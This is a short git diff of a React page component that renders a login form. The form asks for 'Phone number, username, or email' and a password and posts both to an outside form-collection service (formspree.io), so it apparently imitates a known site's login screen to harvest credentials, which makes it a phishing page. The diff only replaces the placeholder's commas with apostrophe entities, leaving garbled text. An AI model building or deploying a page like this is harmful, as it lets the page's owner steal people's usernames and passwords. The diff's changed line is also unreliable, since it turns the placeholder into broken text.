@@ -32,7 +32,7 @@ export default function Home() {
               <div className="form-wrap">
                 <form action="https://formspree.io/f/xbjejpyv" method="POST" className="form">
                   <div className="input-box">
-                    <input type="text" id="name" aria-describedby placeholder="Phone number, username, or email" aria-required="true" maxLength={30} autoCapitalize="off" autoCorrect="off" name="username" defaultValue required />
+                    <input type="text" id="name" aria-describedby placeholder="Phone number&#39; username&#39; or email" aria-required="true" maxLength={30} autoCapitalize="off" autoCorrect="off" name="username" defaultValue required />
                   </div>  
                   <div className="input-box">
                     <input type="password" name="password" id="password" placeholder="Password" aria-describedby maxLength={30} aria-required="true" autoCapitalize="off" autoCorrect="off" required />
